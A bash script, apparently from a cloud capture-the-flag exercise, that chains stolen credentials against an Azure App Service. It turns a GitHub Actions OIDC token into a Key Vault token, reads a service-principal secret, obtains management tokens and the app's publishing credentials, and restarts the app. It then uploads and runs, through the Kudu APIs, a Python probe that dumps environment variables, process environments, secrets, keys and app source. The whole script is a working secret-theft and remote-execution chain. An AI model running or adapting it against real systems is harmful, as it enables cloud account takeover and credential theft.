#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
CICD_ID=72ff278a-9e71-43ec-bac4-2ca303f8e462

OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')

VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$CICD_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$OIDC" \
  --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')

RS_JSON=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4" \
  -H "Authorization: Bearer $VT" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
RS_CID=$(echo "$RS_JSON" | python3 -c 'import sys,json;print(json.loads(sys.stdin.read()).get("appId",""))')
RS_SEC=$(echo "$RS_JSON" | python3 -c 'import sys,json;print(json.loads(sys.stdin.read()).get("clientSecret",""))')

RS_ARM=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$RS_CID" -d "grant_type=client_credentials" \
  --data-urlencode "client_secret=$RS_SEC" \
  --data-urlencode "scope=https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')

APP=app-tbl-reporting-prod
RG_R=rg-tbl-reporting-prod-eus
PUB=$(curl -sS -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG_R/providers/Microsoft.Web/sites/$APP/config/publishingcredentials/list?api-version=2023-01-01" \
  -H "Authorization: Bearer $RS_ARM" -H "Content-Type: application/json" -d '{}')
KU=$(echo "$PUB" | python3 -c 'import sys,json;print(json.load(sys.stdin)["properties"]["publishingUserName"])')
KP=$(echo "$PUB" | python3 -c 'import sys,json;print(json.load(sys.stdin)["properties"]["publishingPassword"])')
SCM="https://$APP.scm.azurewebsites.net"

# Get ARM resource definition for the reporting app (to check UAMI config)
echo "=== REPORTING APP ARM IDENTITY ==="
curl -sS "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG_R/providers/Microsoft.Web/sites/$APP?api-version=2023-01-01" \
  -H "Authorization: Bearer $RS_ARM" | python3 -c '
import sys,json
d=json.load(sys.stdin)
print("identity:", json.dumps(d.get("identity",{}), indent=2))
print("kind:", d.get("kind",""))
print("state:", d.get("properties",{}).get("state",""))
'

# Also restart the app first to ensure MSI is injected
echo "=== RESTARTING APP ==="
curl -sS -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG_R/providers/Microsoft.Web/sites/$APP/restart?api-version=2023-01-01" \
  -H "Authorization: Bearer $RS_ARM" -H "Content-Length: 0" -o /dev/null -w "restart_status=%{http_code}\n"

echo "Waiting for restart..."
sleep 25

# Upload probe that dumps all env vars + filesystem
cat > /tmp/probe3.py << 'PYEOF'
import os,json,subprocess,glob

result = {}

# Dump all environment variables (including app's own from Kudu context)
result["kudu_env"] = dict(os.environ)

# Search all /proc for processes with IDENTITY_ENDPOINT
ie_found = {}
try:
    for pid in os.listdir('/proc'):
        if pid.isdigit():
            try:
                env_raw = open(f'/proc/{pid}/environ','rb').read()
                env_dict = {}
                for e in env_raw.split(b'\x00'):
                    if b'=' in e:
                        k, v = e.split(b'=', 1)
                        env_dict[k.decode('utf-8','replace')] = v.decode('utf-8','replace')
                if 'IDENTITY_ENDPOINT' in env_dict or 'MSI_ENDPOINT' in env_dict or 'FLAG' in env_dict:
                    ie_found[pid] = env_dict
                    break
                # Also capture any proc with WEBSITE_ vars (app service)
                if any(k.startswith('WEBSITE_') for k in env_dict):
                    ie_found[pid] = {k:v for k,v in env_dict.items() if 'IDENTITY' in k or 'MSI' in k or 'FLAG' in k or 'SECRET' in k or 'KEY' in k or 'WEBSITE_' in k or 'APPSETTING' in k}
                    break
            except: pass
except Exception as e:
    result["proc_err"] = str(e)

result["ie_found"] = ie_found

# Filesystem search for flag
flag_files = []
for pattern in ['/home/site/wwwroot/flag*', '/app/flag*', '/flag*', '/tmp/flag*', '/home/flag*', '/home/site/flag*']:
    flag_files.extend(glob.glob(pattern))
result["flag_files"] = flag_files

# Read any flag files
for f in flag_files[:5]:
    try: result[f"file_{f}"] = open(f).read()[:500]
    except: pass

# List /home/site/wwwroot
try:
    result["wwwroot_files"] = os.listdir('/home/site/wwwroot')[:50]
except: pass

# Read app.py or main app file
for appf in ['/home/site/wwwroot/app.py', '/home/site/wwwroot/application.py', '/app/app.py']:
    if os.path.exists(appf):
        try: result[f"src_{appf}"] = open(appf).read()[:3000]
        except: pass

# Check /proc/self/environ (Kudu process env)
try:
    env_raw = open('/proc/self/environ','rb').read()
    self_env = dict(e.split(b'=',1) for e in env_raw.split(b'\x00') if b'=' in e)
    result["self_env_identity"] = {k.decode():v.decode() for k,v in self_env.items() if any(x in k.decode() for x in ['IDENTITY','MSI','FLAG','SECRET','KEY','APPSETTING','WEBSITE_'])}
except Exception as e:
    result["self_env_err"] = str(e)

print(json.dumps(result, indent=2, default=str))
PYEOF

VFS=$(curl -s -u "$KU:$KP" -X PUT "$SCM/api/vfs/site/wwwroot/probe3.py" \
  -H "Content-Type: text/plain" --data-binary @/tmp/probe3.py --max-time 30 -w "%{http_code}")
echo "VFS=$VFS"

echo "PROBE3_OUTPUT:"
curl -s -u "$KU:$KP" -X POST "$SCM/api/command" \
  -H "Content-Type: application/json" --max-time 120 \
  -d '{"command":"python3 /home/site/wwwroot/probe3.py","dir":"/"}'
echo ""
echo "DONE"
